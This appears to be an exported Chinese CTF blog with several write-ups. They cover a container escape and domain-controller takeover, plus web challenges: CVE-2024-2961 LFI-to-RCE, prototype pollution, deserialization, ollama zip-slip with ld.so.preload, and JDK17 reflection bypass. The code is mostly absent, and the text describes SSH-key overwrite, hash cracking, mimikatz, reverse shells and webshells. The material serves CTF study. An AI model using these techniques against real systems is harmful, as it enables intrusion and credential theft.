挂载好后可以对文件进行操作，但是不能做别的事情。此时可以想着去添加一个ssh或者是修改/etc/passwd和/etc/shadow了（root权限的shell挂载之后也是root权限的文件操作 由于添加ssh的操作比较麻烦，这里选择添加/etc/passwd和/etc/shodow 选择用户： 并且添加： 此时尝试利用ssh登录即可，哎哟，这里还是失败了。只能覆盖ssh的key了： 直接狂按enter，会生成没有密码的keygen，再覆盖/home/ubuntu/.ssh/authorized_keys 接下来可以使用自己的私钥登录宿主机 登录成功后可以看到用户是ubuntu，权限不是root，接下来考虑提权到root 查看/etc/sudoers 当然其实也可以直接爆破hash： 得到密码为ubuntu后就可以进入root了： ifconfig发现52网段： 先弹msf： 下载elf，直接用冰蝎传也行，也可以直接wget 弹msf： 成功 打内网 先上fscan扫描52网段，发现dc扫不出来，最后还是改成了183网段 这次试frp内网穿透 frpc通过远程服务器的6002走socks5，通过6001连接frps proxychains添加代理： 之前扫到了128的win7机能够进行ms17_010，打之： 要走socks5的话需要在msf设置代理： 注意由于我们设置了内网穿透，这里的payload要设置成正向连接： 收集一波信息： 拿下dc 那接下来要怎么打dc呢？ 可以先试试ms17_010 d4m1ts知识库里的域控漏洞： 域控漏洞 CVE-2014-6324（MS14-068） CVE-2020-1472（Zerologon） CVE-2021-1675/CVE-2021-34527（PrintNightMare） CVE-2021-42287&amp;CVE-2021-42278 CVE-2022-26923（ADCS） 尝试ms14-068 需要的参数为： 用户名 域名 用户的sid 用户密码 我们已经知道一个用户douser的账号密码了，并且systeminfo得到的域名是Domain: demo.com，接下来可以去尝试获得它的SID 但是我们获得的却是system的sid，权限太高了，我们要手动降一下权限，可以利用msf的steal_token来偷取进程： 此时获取到SID： 此时万事俱备： 不过它生成的是文件，我们还要想办法把这个文件传到上面。注意别传到system32里了，执行不了的 再传个mimikatz 用mimikatz打： 最后验证： 发现msf的票据不行，还得是exe生成的 后面用mimikatz的lsadump抓krbtgt的哈希 "},{"title":"2024鹏城杯线上赛Web方向题解","date":"2024-11-09T15:44:04.000Z","url":"/posts/10200.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"web美美下班，强度很适合我 fileread 源码如下： 链子应该是： exp： 直接读/flag无权限，但是题目提供了/readflag，因此我们要进行rce，联系到file_get_contents的rce就必须是from LFI to RCE，也就是我们的cve-2024-2961 不过原exp在这题的环境下进行交互比较困难，于是我弄到了一个手动版的exp： 使用方法： 首先利用file_get_contents()读到/proc/self/maps并保存到本地，注意maps的格式必须是一行行的，而不是一行写下去的那种。 然后运行一次exp，这个时候它会打印[*]download: xxx，这个xxx是我们需要的libc 再利用file_get_contents()获取上一步中给出的libc并保存 最后再运行一次，得到payload 对maps和libc个人的处理方式就是利用base64加密获取到结果后再解密保存 最后将payload赋值给filename就能够写如一个shell，调用/readflag即可： notadmin 题目给出了附件，一眼顶针能够鉴定为原型链污染，并且在/login的时候可以进行污染： 可以看到当我们访问/的时候可以在通过authenticateToken之后进行eval(tmp_user.code)，很明显这tmp_user.code并不存在，需要我们进行原型链污染 题目还有一个check函数： 我们首先要做的第一件事就是通过authenticateToken，可以看到它的secretKey是执行这个函数并且当key不存在的时候才会生成随机的。因此我们可以先行污染secretKey使得其存在且可控。后续我们直接能够伪造出jwt通过验证(他这个merge的形式和平时的不太一样，这里可以直接像下面那样写)： 登录时发送过去后我们的secretKey就被指定为了114514，后续去jwt.io能够伪造token通过验证： 带上 authorization 发根路由就能触发 eval 了 下面就是waf的问题，这里可能是因为merge在check的上面，导致我们可以污染check绕过它的waf： 污染check： 最后污染code： Python口算 学弟秒了，我直接抄他wp了： 开局脚本伺候： 拿到hint 根据代码修改： 在测试绕过 ez_python 有点脑洞+爆破的思路在里面 首先dirsearch扫出/login路由 接下来首先尝试admin账户爆破失败，但是突发奇想试试test用户，毕竟这用户省赛的时候就吃过一次亏了。结果还真有，爆出用户test/123456 这是一个test用户，登录成功后可以发现有一个按钮，点一下会显示不是管理员，上图可以看到在登录成功后会获得一个jwt的token。因此题目暗示我们需要去修改jwt的token。经过上次长城杯的教训这次我们学精了，直接爆破key先，结果还真是，爆破出key为a123456。 去jwt.io美美修改key后重新点击按钮可以得到一串unicode： 得到新路由/ser /ser路由如下 很明显是一个简单的pickle反序列化。随便找个payload都能打： vps监听，然后执行shell就过来了 ezlaravel laravel框架v8.83.27 最开始的灵感来自N1CTF2023的laravel，题解在这。想着用它的exp一把梭，结果提示这个filter不存在/无法创建： 然后找到了另外一个洞：  这个直接跟着链接打就可以了： 得到上面的结果后直接跟着打 清空laravel.log: 添加前缀： 写入phar： 注意最后要加一个a 去除脏数据： 触发phar 注意最后的phar是绝对路径，要自己慢慢试出来的。具体怎么试的我就不把图放上来了。最后读取flag即可： LookUP 求一个预期解的wp T_T 题目写了一个自定义的objectInputStream，并且重写了resolveClass添加黑名单： 但是可以看到这个黑名单并没有过滤SignedObject和jackson啊，很明显可以通过二次反序列化直接绕过过滤。 仔细看pom.xml，题目还提供了rome 1.0，因此思路就可以是SignedObject配合Jackson打二次反序列化触发rome了，exp如下： payload： 直接将payload打过去即可 "},{"title":"dasctf十月web方向部分题解","date":"2024-10-24T09:21:25.000Z","url":"/posts/49264.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"被ld.so.preload气晕。 ollama4shell 评价为最有遗憾的题目，就是差那个so就写出来了，真恶心啊。 ollama 0.1.34之前存在一个cve-2024-37032，但是题目给的ollama版本是1.4.0已经修复了，只能够另寻它路 发现了一个新版的任意文件写入：  这个是通过zip-slip漏洞从而将文件任意写入的洞，目前exp： 用这个exp可以直接写入。 关键是任意文件写之后我们要怎么操作呢？？ 在cve-2024-37032的利用中已经提到了这一点：  Finally, Remote Code Execution As we mentioned previously, it is possible to exploit the Arbitrary File Write vulnerability to corrupt certain files in the system. In Docker installations, it is pretty straightforward to exploit it and achieve Remote Code Execution, as the server runs with*root* privileges. The simplest way we thought of achieving remote-code-execution would be to corrupt ld.so configuration files, specifically /etc/ld.so.preload. This file contains a whitespace -separated list of shared libraries that should be loaded whenever a new process starts. Using our Arbitrary File Write exploit-primitive, we plant our payload as a shared library on the filesystem (/root/bad.so) and then we corrupt etc/ld.so.preload to include it. Finally, we query the /api/chat endpoint on the Ollama API Server, which subsequently creates a new process and thus loads our payload! 简单地说就是利用/etc/ld.so.preload+任意so即可。当写入成功后需要调用/api/chat从而开出一个新进程触发ld.so.preload 这里ld.so.preload的内容就是你恶意so的路径，但是使用ld.so.preload会使得每次都会开一个新进程，导致直接被卡死(本地vps上试过，本地环境也试过)，导致反弹不了shell。就是差这最后一步，必须要删除/etc/ld.so.preload才能够正常。 解决的方式就是在编写的c里面加上这一删除的过程： 编译成so： 制作zip-slip的脚本如下： 之后流程跟exp来就可以了，此处需要写入两次，第一次写入1.so，第二次写入/etc/ld.so.preload linux虚拟机内的sha256sum命令能够快速算出我们生成的zip包的sha256值，之后只需修改 最后一条sha256的值和这个文件的sha256值即可 latest文件也需要更新： 只需修改最下面的sha256值即可，为了方便我vps里起了两个相似的文件夹，另一个写入/etc/ld.so.preload的不用动 保证文件夹符合exp内的tree格式即可 接下来请求/api即可，注意对http请求要添加Insecure:true 此时再申请create安装，sha256更改为恶意zip的sha256 此时已经安装成功，本地查看： 估计重施安装/etc/ld.so.preload即可，之后需要去/api/chat触发新进程，官方api里是这么调用/api/chat的： 这里需要一个model，我们还需要去安装一个model下来，官方api内提供了一个占用很小的model——all-minilm，这个甚至在100M以内，所以我们能够很快地把他pull下来： 但是这里报了个错 是的，这个模型不支持chat，那要怎么办呢 看官方api的演示，这里有个generate，说不定能靠此生成进程： 答案是可以的，这样shell就弹过来了，妈妈生的。 远程环境再复现一遍即可 真的是被气死了，操他妈的 paisa4shell 这题没做，看看思路。 题目提示： 前台RCE，题目使用官方docker镜像；flag请提交DASCTF{}里的内容； 鉴权能绕、文件覆盖 首先是绕鉴权，一般都是/api，直接访问/api会报Invalid token，我们搜索这个错误： 可以看到它是这样判断的 那这个c.Request.RequestURI是啥呢，问问ai： 可以得到关键字： 此时如果我们将/apiurl编码的话，获取到的URI就是/%61pi，而不是/api，自然就绕过了鉴权。在server.go文件内有很多api接口，可以测试一下： 可以看到确实是可以的，那前台rce又怎么来的呢，前台RCE+文件覆盖 联想到rce，我们先在文件里面搜一下有没有内置的exec： 锁定ledger.go并且查看： 可以看到这里执行了err = utils.Exec(ledgerPath, &amp;output, &amp;error, args...) 相当于把这个ledge文件执行了，我们往ledge里面写内容不就可以了吗 可以看到ledge应该放在了/usr/bin里，名字叫ledger 覆盖这个即可，知道写什么了，那怎么调用这个函数执行呢？ 搜索ValidateFile()函数，看和api有没有联系： 可以看到/api/editor/validate调用了它 问题迎刃而解，现在只剩下要怎么覆盖的问题了，看看api里有没有覆写的api吧： 这个保存文件的api比较可疑： 尝试利用这个api写文件即可，具体怎么写呢，还是看ai： 也就是说我们要用json传值，且变量名和LedgerFile结构体内的一致： 肯定要传name和content的啦： 啊？这个api不行？那我们找一个相似的： 这个也是有相似功能的，写进去了： 访问/api/editor/validate触发 ezlogin 这个题本人觉得还是挺有意思的，知识盲区，学习了 一个登录的java服务，org.example.UserUtil如下： 这里存在一个xml反序列化，就在readUser() 这里做了一个waf，过了waf之后就调用readObjectfromXml进行xml反序列化 思路很简单，怎么控制这个xml能够自由写入，而且要写入什么。而且写入也是有限制的，在register里就给你写好了这个userfile： 能写入的只有username和password，而且username和password写入的长度十分有限，分别只有最多6位和最多10位 题目提示： 逻辑漏洞 &lt;!– 这个提示是&lt;!--是xml的注释符，那题目就是提示我们去找能够注释掉的地方，而且不是注册接口，因为注册的地方不允许我们写入太长的payload。几个controller只剩deleteController和editController没看了，RegistryController我们说了没啥用，LoginController是正常的 delUser的调用也没有什么问题，没有涉及到文件的写，而是直接删除了这个文件： 那就只有edit了，而edit里只有修改密码： 可以看到他从我们的session里获取了我们的信息，再根据这个session里的信息去获取到的username password。 也就是说调用changepassword的时候其实是获取到了我们session里的信息再用这个信息去改的 而修改的时候是直接将xml里的oldpass给replace成newpass 那这里就有漏洞了，如果session不变的话，我就可以限制oldpass为xxx，此时newpass为aaaxxx，这样replace后文件就会变成aaaxxx，但是oldpass还是xxx，下一次newpass变成bbbxxx，这样子，下一次重置就变成了aaabbbxxx，这样一直写下去就可以了 而且可以很明显的发现session是不变的，无论是edit还是del都不会对session有影响。而且这也有一个好处，我这样还可以对同一个user的xml进行不断的修改，流程就是不断地注册同名用户，然后获取到session后就可以删除。 还有个问题就是写啥？ 这是一个spring服务，所以肯定有jackson，我们还不能够直接传payload进去，因为payload太长了(个人认为)，这题目还有长度的限制。要想缩短长度得用jrmp的思路 也就是： AAAAAA.xml： 而写入的文件就跟这个AAAAAA.xml几乎一致，这意味着我们要利用刚刚那个方法去改xml，我们还得把它改短： 以/ /为分界线，分界线里面是我们需要的，其他的是我们需要注释掉的或者需要换掉以缩短长度的，而/ /就可以替换为--&gt;和&lt;!--进行注释。真正要写入的内容变为： 我们可以通过下面的方式去注释： 注册关键词用户，获取他们的session，将其修改为最短的111(密码最短3位) 对于&lt;java&gt;&lt;/java&gt;这两个我们可以改成&lt;!--注释符，将java替换为!--配合我们的注释符 对于写入payload，只需将oldpassword设置为任意标识符，例如_____，然后newpassword为xxxxx_____即可不断写入 由此可以写一个exp，这里就直接利用出题人的wp了： 可惜复现失败T_T，投降，jndi还是太难了 updated in 2024.10.26 红温了，原来是我vps没有开放80端口： 可以看到红框内换到6001端口就能发payload了，按照正常流程打一遍jrmp即可: shell弹过来了： "},{"title":"tornado原型链污染学习","date":"2024-10-16T05:39:55.000Z","url":"/posts/61598.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"来自数信杯的一道题目，涨知识了。 引入 由于本人并没有打数信杯，所以只能够简单复现一下环境了，网上搜到的源码基本上都是这样的(我在此基础上做了一点修改)： python原型链污染 可以看到我们的一个老朋友merge，除开这个waf以外，就是我们的原型链污染。简单介绍一下就是能够通过原型链污染掉类里面没有的属性，在调用一个类或者实例的属性的时候，如果没有找到，就会对应的父类中去找。这就是原型链的原理，如果我们改掉他的父类的值，我们就能够改掉这个类或者实例的值了，而merge这个函数就能够做到 挖掘 在此思路上，我们怎么去做这个题呢？ 受到CISCN Sanic这题的启发下，想到的第一个可能性就是看看能不能够污染static，使其可以修改成我们的任意静态目录，如果能够修改到根目录下，就能够暴露出/flag并且直接访问 注意我们不能够污染static_path，因为它只用于初始化。也就是说它只在程序被访问的时候使用过一次，后续都是程序内部的一个属性里加载static_path的值了 意思是就是static_path赋值给了tornado内的某一个属性，我们只需要污染这个属性就可以修改static_path 查看tornado官方文档的静态文件处可以得知静态文件采用StaticFileHandler来处理 在tornado.ioloop.IOLoop.current().start()处下断点调试，试图寻找到static_path被赋值到了哪里，最终发现在wildcard_router.rules里有它的身影： 利用evaluate expression来看怎么调用污染： 为了利于我们测试，我们往get路由修改为： 调试： 可以得到回显： 确实能够得到我们的static_path 但是我们能够直接修改吗？试试payload： 答案是不行，此时渲染之后访问会发现直接报错： 省流就是： 对的，有个matcher这个东西在搞鬼 我们重新debug一下： 会发现rules这个数组的每一个元素里都有四个部分： 更加烦人的是这个matcher是一个对象，我们不能够直接用json来覆盖： 也就是说我们试图修改static失败了 rce1 参考tornado模板注入，我们可以发现一个问题： 对于 Tornado 来说，一旦 self.render 之后，就会实例化一个 tornado.template.Loader，这个时候再去修改文件内容，它也不会再实例化一次。所以这里需要把 tornado.web.RequestHandler._template_loaders 清空。否则在利用的时候，会一直用的第一个传入的 payload。 也就是说我们可以控制_template_loaders的值改为我们的ssti语句从而成功rce。由于它在RequestHandler._template_loaders，我们尝试从p = Pollute()找到它的位置： 能够找到IndexHandler找不到requestHandler 进IndexHandler看看： 里面确实有： 再进去找到_template_loaders 它的输出是这样的 比较奇怪，我们再进去看看： 利用__dict__查看： 看到我们的index.html了，再跟进： 发现里面有个code： 问问ai： 这段代码是一个Python函数，名为 _tt_execute，它的作用是生成一个简单的HTML页面。下面是代码的逐行解释： _tt_execute(): 定义了一个函数 _tt_execute，没有参数。 _tt_buffer = []: 初始化一个空列表 _tt_buffer，用于存储HTML页面的各个部分。 _tt_append = _tt_buffer.append: 将列表的 append 方法赋值给 _tt_append 变量，用于后续添加HTML代码。 _tt_append(b'&lt;!DOCTYPE html&gt;\\n&lt;html lang=&quot;en&quot;&gt;\\n&lt;head&gt;\\n&lt;meta charset=&quot;UTF-8&quot;&gt;\\n&lt;title&gt;Test&lt;/title&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n'): 向 _tt_buffer 中添加HTML页面的头部和 &lt;body&gt; 标签的开始部分。 _tt_tmp = 1: 初始化一个变量 _tt_tmp 并赋值为整数 1。 if isinstance(_tt_tmp, _tt_string_types): _tt_tmp = _tt_utf8(_tt_tmp): 检查 _tt_tmp 是否是字符串类型，如果是，则将其转换为UTF-8编码的字符串。 else: _tt_tmp = _tt_utf8(str(_tt_tmp)): 如果 _tt_tmp 不是字符串类型，则先将其转换为字符串，然后再转换为UTF-8编码的字符串。 _tt_tmp = _tt_utf8(xhtml_escape(_tt_tmp)): 对 _tt_tmp 进行XHTML转义，以确保HTML代码的安全。 _tt_append(_tt_tmp): 将转义后的 _tt_tmp 添加到 _tt_buffer 中。 _tt_append(b'\\n&lt;/body&gt;\\n&lt;/html&gt;\\n'): 向 _tt_buffer 中添加HTML页面的结束部分，包括 &lt;/body&gt; 和 &lt;/html&gt; 标签。 return _tt_utf8('').join(_tt_buffer): 将 _tt_buffer 中的所有部分连接起来，并返回一个UTF-8编码的字符串，这个字符串就是完整的HTML页面。 注意：代码中提到的 _tt_string_types、_tt_utf8 和 xhtml_escape 函数没有在代码片段中定义，它们可能是在其他地方定义的辅助函数，用于处理字符串类型、编码和转义。_tt_utf8 函数可能是用来将字符串转换为UTF-8编码的函数，而 xhtml_escape 函数则用于转义HTML特殊字符。 简单地说就是这玩意就是用来渲染我们的html的，而且你看tt_tmp不就是我们的&#123;&#123;1&#125;&#125;吗，那修改了code是否就能够成功了呢？ 实际上是不行的，而且这搞得json过于冗长，而且将其code随意更改后也没有爆出任何的异常： 只能另寻他路，注意到我们还有一个compiled，这里既然是关于模板渲染的问题，那去它的源码看看(template.py) 搜索关键字以后可以搜到generate()函数内有该code的生成逻辑： 而且仔细观察可以发现code其实是由很多个generate()函数生成的，这是最后一部分： 它的调用始于： 这里的generate就是指向上面最后的一部分，可以得到return buffer.getvalue()应该就是得到code 往上一级查看_generate_python在哪被调用了： 可以看到它将这段代码编译好了，compiled就是用在这里的，把编译好的对象放入compiled，然后下面的Generate函数是专门根据compiled生成模板的 关注exec_in 如果code是str类型的话也会编译运行，所以我们可以直接改compiled为str进行模板注入： 目前只能够实现这样的rce，而且static目录必须是可以写的 而且有一个最大的限制：你要知道项目的名字是什么，就像这里D:\\pycharm\\tornado_prototype，如果你不知道这个就不能这么样去用，这个方法局限比较大，因此我们还得找一条其他的路 rce2 重新探索该模板还有什么地方能够让我们更加方便地rce，重点看我们的模板，此时会发现有一个地方写入了一个新的东西： 控制autoescape的地方在这里： 关键是loader如果我们能够控制loader的话就能够控制autoescape 按ctrl+left跟随autoescape： ctrl+alt+f7查看BaseLoader查看在哪被定义的： 锁定web.py 可以看到 也就是说我们只需要控制settings就可以控制autoescape了 debug一下看看settings在哪就可以了，其实就在app里 最后我们只需要拿到app就可以了，简单测测就知道通过p.__init__.__globals__['app']就能拿到 那exp就很简单了，注意一下要闭合： 这里还有一个需要注意的小点就是上面这个地方，如果直接写就是会报缩进错误，所以此时要空4个格就可以了。 同样地没有回显，所以只能够打反弹shell之类的了 Reference  "},{"title":"从2024巅峰极客的easy_java学习jdk17下的反序列化","date":"2024-10-12T14:38:18.000Z","url":"/posts/24747.html","tags":[["java","/tags/java/"]],"categories":[["java","/categories/java/"]],"content":"好久没更新博客了，水一篇 引入 最近在学rmi，有点看不太下去了，回来想想发现巅峰极客里面还有一道jdk17下的java反序列化不太会，所以就来重新学习一下。发现先知里有人发文章了，那这样就能够让我更好地跟着去学了，感谢！ 直接摆文章上来：2024 巅峰极客 easy_java学习jdk17下打内存马方式 简单的分析已经在我的巅峰极客题解里有了，这里就再简单讲讲： 黑盒环境，题目页面仅有一句话： only with jdk17 and cb 经过测试发现org.apache关键字被禁用 这里有一个得知道的小知识点就是高版本下的cb会自带有cc依赖，就像我下面这张图展示的一样： 此时我们的思路就逐渐地明确起来了，就是打commons-collections，同时由于过滤了关键字，此时我们就可以用UTF8 Overlong Encoding来绕过。 那问题就是，在高版本下我们有几个问题： jdk17下，有反射的限制，在jdk17以及之后无法反射java.*包下非public修饰的属性。这是Oracle对java本身代码的安全性考虑所做出的保护。 调试的时候可以知道高版本下并没有templatesImpl，并且这个环境是不出网了，因此我们要进行内存马的注入，没有templatesImpl我们要怎么注入内存马呢？ 绕过反射限制 要绕过反射限制之前，还是补充一下不同jdk版本所做的限制 jdk8及以前 这个版本下的jdk对反射是没有一点限制的，我们平时做java的反序列化大多都在这个版本(指jdk8)，我们各种java的poc都可以流畅地编写 jdk9-jdk16 从jdk9开始，当我们用反射去获取java.*包下的非public变量和方法的时候会报警告。由于我没有jdk9-jdk16的环境，所以我这里直接搬运一下pankas师傅的测试用例： 这里通过反射去调用defineClass去加载恶意类，此时会出现警告： 这里虽然是会报警告，但是还是能够正常地反射调用的。 jdk17+ 在jdk17+下就会报错： 这个就是因为在jdk17+下java启动了强封装机制，java.*下的非public字段和方法都无法通过反射进行获取调用 它的限制逻辑主要在setAccessible方法里 这里如果我们调用反射xxx.setAccessible(true)的话，这里的flag就是true，会进入checkCanSetAccessible(Reflection.getCallerClass())检查是否能够设置为true 接着看这个方法，最终会进入到java.lang.reflect.AccessibleObejct#checkCanSetAccessible(java.lang.Class&lt;?&gt;, java.lang.class&lt;?&gt;, boolean) 这段代码的逻辑就是判断我们是否能够将它setAccessible(true)，这里有很多个return true，我们优先从头开始看： 这里重点看前面两个： 这里补充一下： caller就是我们当前运行的java文件 declaringClass是我们需要通过反射修改的类 此时我们return true的条件就是： caller和我们反射调用的目标类的module是同一个 或者caller的module和Object类的module是同一个 绕过限制  在官方文档里，提及了一点： Note that the sun.misc and sun.reflect packages are available for reflection by tools and libraries in all JDK releases, including JDK 17. 也就是说在jdk17下，sun.misc和sun.reflect包下的内容是可以正常反射调用的，因此我们可以使用sun.misc.Unsafe来进行绕过。通过Unsafe类里的getAndSetObject方法来修改调用类的module 这里就不墨迹了，直接放exp: 使用例： 公式绕过 集成以后的公式，注意有的地方是EXP().xxx，如果你的类名不叫EXP这里是需要改的： 要使用的时候就直接调用patchModule就可以了，一般只需要patchModule本类和需要使用到的java大类就可以了，例如本题中我们需要使用到UTF8Overlong，我们只需要： templatesImpl替代 jdk17下已经不能够使用templatesImpl来加载恶意字节码了，我们需要找到一个新的替代类，这个替代类能够执行defineClass加载字节码 直接说结论，就是通过MethodHandlers的内部类Lookup来加载字节码 但是这个方法有一点限制： 跟进makeClassDefiner 此时会传入我们的bytes，同时newInstance之前还有一个参数lookupClass().getPackageName() 这个其实就是我们调用lookup方法的包名，我们调用MethodHandles内部类Lookup的时候就是通过lookup方法实例化的： 传入的参数就是Reflection.getCallerClass()也就是我们的InvokerTransformer类 加载字节码的时候会进行一个判断，判断恶意类是否和调用者在同一个包下，只有同一个包下才会加载字节码 因此我们需要用chainedTransformer的方式去调这个defineClass 总之还是有公式： 记一个SpringEcho 这里记一下SpringEcho的内存马，注意package： 整理exp 这边就不用easy_java的exp了，直接在我自己的电脑上测试一下就可以了，UTF8Overlong的exp在博客里有，不过需要严格注意包名，都需要在commons.collections.functors包里 导入一个高版本的cb 运行的时候需要注意添加参数： 整理得出的exp如下： Evil.class： 这里吃了上次羊城杯的亏，所以static和constructor函数都加了一模一样的代码，所以反序列化的时候就会弹两个计算器。 UTF8_overlong_encode，这里和之前的地方做了一点小改动，如果直接照搬的话会报错，说你没有无参构造函数，就不能够patchModule了，所以开始我就加上了它的无参构造函数： 运行之后的结果如下： 可以看到我们成功触发了计算器。当我们需要加载内存马的时候直接使用SpringEcho替代就可以了 Reference jdk17反射限制绕过 2024 巅峰极客 easy_java学习jdk17下打内存马方式"},{"title":"ErloGrave 复现","date":"2024-09-15T11:03:10.000Z","url":"/posts/42959.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"菜！又被das暴打了 启动环境 题目附件提供了docker环境，直接利用: 一键搭建docker就可以了，如果中间java的docker没有下载好，可以先单独下载下来。 docker启动后就可以访问index.jsp来到我们的登录页了。 源码怎么说 看了源码发现他的登录逻辑是直接被写死了，只能够通过下面这个账号密码登录： 无论登录成功还是失败，都会调用CacheUtil.setWithExpiry。看看他是个什么函数： 乍一看居然是jedis。jedis其实就是redis的java版本，又由于题目的源码只有一个loginServlet和一个CacheUtil，登录成功后往redis写信息，就这么简单的逻辑，哪里有洞呢？ Jedis 现在看来基本上也只能够锁定jedis了。搜一下java redis漏洞，找到了浅蓝师傅的文章。文章里提到了java反序列化，但是他给出的代码显然和我们题目的写法是有出入的： 我们仅仅只调用了setex，并不能造成上述的反序列化漏洞。那现在我们能做什么呢？线索到这里似乎是断了。 Session反序列化 从Y4er师傅的文章里找到了一点蛛丝马迹： 拓展下攻击面，比如redis，这里@l1nk3r师傅公开了另一种使用redis的反序列化场景，问题出现在RedisSession类中，原理和9484差不多，id从jsessionid获取，value是反序列化数据，配合redis任意写入value来触发反序列化。 但是很可惜，l1nk3r师傅的博客已经关站跑路了，所以没得看具体的细节，只能够看这寥寥数行文字来进行攻击了。 简单地说就是需要通过jsessionid来获取到我们对应的id（key），这个时候会读取到它具体的value，从而进行反序列化。由于登录的时候会对我们的数据进行base64decode，所以我们可以直接往redis写入任意反序列化数据。 看了一眼lib，发现了一个cc依赖： 想到可以打cc链进去配合session反序列化数据。因为是cc依赖，所以直接用ysoserial生成就可以了。考虑出网的话可以尝试反弹shell，如果不出网的话就打一个jsp马就好了。 尝试cc6+反弹shell。这里要注意一下逻辑，我们往redis写的key是： value是： 简单地说就是往password里写入反序列化数据，然后将jsessionid改成key的值即可触发session反序列化 现在登录： 必定登录会失败的，因此redis里的key写入的就是fail::Err0r233 将jsession修改一下然后重发，shell就弹过来了。 不出网的时候打一个jsp webshell到web目录就可以了： web目录一般在： jsp webshell： 将其b64加密后，写进cc6的命令里就可以了： 重复上面的操作即可打jsp webshell进去。"},{"title":"第四届长城杯网络安全大赛Web方向思路及题解","date":"2024-09-10T10:21:03.000Z","url":"/posts/27646.html","tags":[["Web","/tags/Web/"]],"categories":[["CTF","/categories/CTF/"]],"content":"填错信息导致没有号打这个比赛，就随便看看题了，没想到他们都做不出来。 SqlUp 这里一个登录框，发现可以通过 登录成功。 登陆成功后就是一个普通的仪表盘，点击头像发现可以更改头像。头像上传后直接302跳转回原页面，这里需要猜一下上传的目录上传在哪里了。 这里还是很好猜的，第一次就才对了，上传的文件放在了/uploads文件夹下，并且文件上传中不能够有p这个字符。 这里就是采用最简单的思路，经过测试发现可以使用.htaccess进行绕过，准备一个.htaccess: 上传后随便传一个1.txt并且内容是shell就可以了。 发现flag没有读权限，尝试find寻找有suid标志位的应用。 发现tac有权限，就直接利用就可以了。 CandyShop 源码如下： 一眼顶针鉴定为python原型链污染，但是原型链污染只能够在admin登录成功才能够merge，而且merge的时候还是对session进行merge。因此能够获取到session对我们尤为重要 如何获取session呢？和我们的secret_key有关，既然我们只有app.py，而且需要我们修改session后才能够污染，那我们势必是能够破解出它的secret_key的。也就是说我们的secret_key必须是有规律的东西，又或者是弱密码。 走弱密码字典爆出来key是a123456，通过flask-session-cookie-manager进行session的修改就可以登进admin了。 至于这个merge在哪里有用呢？ 搜到了一篇文章，这里是利用pydash进行原型链污染的，但是大同小异。其中有许多共同点：Anozer Blog 这个文章是通过原型链污染secret_key从而利用render_template_string这个函数进行ssti。 但是这一步我们已经做完了，所以我们要做的就是直接进行ssti。而这一步的inventory_value是通过inventory这个全局变量得来，所以我们这里可以利用原型链污染污染inventory这个变量就好了。 再仔细看看inventory_value，它是通过re正则表达式去掉下面的字符： 过滤了字母+下划线。考虑利用八进制编码绕过，其中x为实际测试得到的数字： 然后把所有的字母都改成八进制编码并且进行转义，然后加密到session里就可以了，记得怎么进行python原型链污染的就ok： 到这里已经把大致思路讲完了，后面rce的过程省略。flag在/tmp下。"},{"title":"真正的from LFI to RCE——CVE-2024-2961","date":"2024-09-09T05:34:17.000Z","url":"/posts/28510.html","tags":[["基础漏洞","/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"categories":[["基础漏洞","/categories/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"]],"content":"重新拾起被曾经被我忽视掉的漏洞——CVE-2024-2961 LFI LFI，全称local file include，也就是我们的本地文件包含，在我的文件包含篇有讲到，其最简单的格式就是： 其最基本的利用形式就是直接包含文件名，如果它是个php文件，我们就用伪协议的形式将其base64后的结果包含进来。 可以利用data伪协议包含shell，其本质就是写入了一段内容，并且把这个内容包含进来了而已： 由此我们引出了伪协议和过滤器filter的概念，php里有各种不同的filter，也可以同时使用多个不同的或者重复多次使用一个filter，每次使用一个filter都需要用|分隔开，例如对flag.php采用两次convert.base64-encode： 一些常见的filter： convert.base64-encode，执行base64加密 convert.base64-decode，执行base64解密 string.lower，将字符串转换为小写 string.upper，将字符串转换为大写 convert.iconv.X.Y，将字符集从X转换成Y 重点讲一下最后一个过滤器，利用到了iconv这个东西，这个在我的文件包含里也有讲过，合理搭配iconv过滤器能够产生意想不到的结果： 例如我们将字符集从我们常用的UTF-8转换为CSISO2022KR： 它的结果变成了： 利用base64_decode会有一个特性，只接受某些ascii字符([A-Za-z0-9+=])进行解密，这样就能够去掉C前面的非法字符。由于我们进行了b64decode，会导致原本正常的Caaaaaaaaaaaaaa变得异常。因此我们再进行一次base64加密即可： 此时的结果会变成：Caaaaaaaaaaaaaa 由此引出了我们文件包含的一个新的利用方式，iconv。利用iconv可以在文件面前合理添加出我们的字符，例如某道题限制只能够包含/resource=/etc/passwd，但是前面的filter能够让我们自定义添加，这个时候我们合理构造使用的filter就能够写出一个webshell让我们包含，详见php_filter_chain_generator.py： 用法： 侧信道 由LFI的iconv的filter引发出了另外一个攻击方式——侧信道。 能够利用到php伪协议的函数包括但不限制于include，例如file_get_contents()、file()这些读取函数但是无回显的内容也能够利用file_get_contents()。 使用convert.iconv.UTF8.UCS-4LE可能会造成php资源的溢出。因为php.ini中的memory_limit限制了读取的资源大小，默认值为128MB，如果超过此大小，就会导致错误，使得服务器返回500的响应码。 经典老文：PHP Filter链——基于oracle的文件读取攻击 - 先知社区 (aliyun.com) 最后采用dechunk进行分块传输编码逐步读取文件的字符即可。 所有能够受到影响的函数如下： LFI to RCE 铺垫了这么久，终于进入到正题了。上面讲过了我们的所有能够被filter chain影响的函数都会有这个洞。当php进行字符集转换的时候，它会去调用iconv()函数。这是一个使用转换描述符将输入缓冲区中的字符转换为输出缓冲区的api，前面加黑的字体很难懂，反正就是缓冲区的东西。而在linux上，这个api采用glibc实现，iconv()函数如下： 如果输出缓冲区不够大，iconv()就会报错，这个时候可以重新分配outbuf并且再次调用iconv()，确保永远不会从输入缓冲区读取超过或者向输出缓冲区写入超过inbytesleft或者outbytesleft的数据。也就是通过分配，能够确保不会触发溢出问题 但是有一个字符集打破了这一永远。 ISO-2022-CN-EXT 没错，又是我们的中文字符。果然中华文字博大精深(x) 该字符集存于：glibc/iconvdata/iso-2022-cn-ext.c 看两个else if的*outptr。它会将要转换的字符输入转换成四字节的输出，并且没有做任何的检验就输出。 这样有可能会产生出六种输出： 